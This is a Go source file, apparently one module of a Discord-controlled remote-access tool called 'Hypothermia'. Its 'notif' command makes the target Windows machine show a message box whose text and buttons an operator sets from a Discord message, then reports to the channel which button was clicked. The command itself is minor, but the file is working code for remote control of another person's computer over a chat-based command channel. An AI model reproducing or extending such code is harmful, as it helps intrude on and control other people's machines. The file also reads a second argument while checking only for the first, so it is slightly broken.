package commands

import (
	"strings"
	"syscall"
	"unsafe"

	"Hypothermia/src/utils"
	"github.com/bwmarrin/discordgo"
)

const (
	notifButtons string = "abort-retry-ignore\ncancel-try_again-continue\nhelp\nok\nok-cancel\nretry-cancel\nyes-no\nyes-no-cancel"
	notifUsage   string = "[text] [title] [button?]\n\nButtons:\n" + notifButtons + "\n\n*separate words with underscores"

	notifArgsError    string = "🟥 Expected 2 or more arguments."
	notifConvertError string = "🟥 Failed to convert argument."
)

var msgBox *syscall.LazyProc = utils.User32.NewProc("MessageBoxW")

func (*NotifCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
	if len(args) == 0 {
		_, err := s.ChannelMessageSendReply(m.ChannelID, notifArgsError+"\nUsage: "+notifUsage, m.Reference())
		return err
	}

	text, err := syscall.UTF16FromString(strings.ReplaceAll(args[0], "_", " "))
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, notifConvertError, m.Reference())
		return err
	}

	title, err := syscall.UTF16FromString(strings.ReplaceAll(args[1], "_", " "))
	if err != nil {
		_, err := s.ChannelMessageSendReply(m.ChannelID, notifConvertError, m.Reference())
		return err
	}

	var button uint
	if len(args) > 2 {
		button = utils.GetButtonFlag(args[2])
	} else {
		button = utils.MB_OK
	}

	ret, _, _ := msgBox.Call(
		uintptr(0),
		uintptr(unsafe.Pointer(&text[0])),
		uintptr(unsafe.Pointer(&title[0])),
		uintptr(button),
	)

	_, err = s.ChannelMessageSendReply(m.ChannelID, utils.GetButtonClicked(ret), m.Reference())
	return err
}

func (*NotifCommand) Name() string {
	return "notif"
}

func (*NotifCommand) Info() string {
	return "displays a messagebox"
}

type NotifCommand struct{}
